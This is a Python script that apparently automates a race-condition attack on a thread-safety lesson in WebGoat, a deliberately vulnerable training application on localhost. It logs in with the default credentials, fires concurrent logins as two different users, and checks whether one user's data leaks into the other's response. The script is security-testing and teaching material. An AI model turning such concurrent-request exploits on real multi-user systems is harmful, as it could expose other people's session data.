import requests
import threading
from sys import exit
from time import sleep

'''
A program to exploit a thread-safety vulnerability in WebGoat.
- Creates two threads that simultaneously log in with different usernames.
- If a user gets the data of the other user, the vulnerability exists.
- This check is run 10 times to be more robust.
'''

vuln = False

def findUrl(text):
    # Finds the Screen and menu numbers from the JSON.
    chunk = text.split('Thread Safety Problems')[1]
    chunk = chunk.split('}')[0]
    chunk = chunk.split('attack?')[1].split('"')[0]
    return chunk

def vulnFound(text, wrongname):
    # Checks whether the vulnerability was found, by
    # counting the occurrences of the wrong name.
    count = 0
    lines = text.split('\n')
    for line in lines:
        if wrongname in line:
            count += 1
    if count > 1:
        return True #vuln exists
    else:
        return False

def logIn(username, wrongname):
    global vuln
    # Create a session to maintain login state.
    s = requests.Session()
    r = s.get('http://127.0.0.1:8080/WebGoat/start.mvc')
    r = s.get('http://127.0.0.1:8080/WebGoat/login.mvc')
    # Log in to be authenticated.
    params = {'username':'webgoat', 'password':'webgoat'}
    r = s.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check', params)
    r = s.get('http://127.0.0.1:8080/WebGoat/attack?Screen=42&menu=100')
    # Dynamically get the Screen and menu numbers.
    r = s.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')
    url = 'http://127.0.0.1:8080/WebGoat/attack?' + findUrl(r.text)
    # Log into Thread-Safety page with given username.
    params = {'username':username}
    r = s.post(url, params)
    # Check whether the vulnerability was found.
    if vulnFound(r.text, wrongname):
        vuln = True
    
def attack():
    global vuln
    for i in range(10): #TO SHORTCIRCUIT: Change 10 to 1
        # Begin two threads which log in with different usernames.
        a = threading.Thread(None, logIn, None, ('jeff', 'dave'))
        b = threading.Thread(None, logIn, None, ('dave', 'jeff'))
        a.start()
        b.start()
        if vuln:
            # Exit with an error if vulnerability is found.
            print "Vulnerability Found"
            exit(1)
        else:
            sleep(1)
    # Exit 0 otherwise.
    print "No Vulnerability Found"
    exit(0)
    

attack()
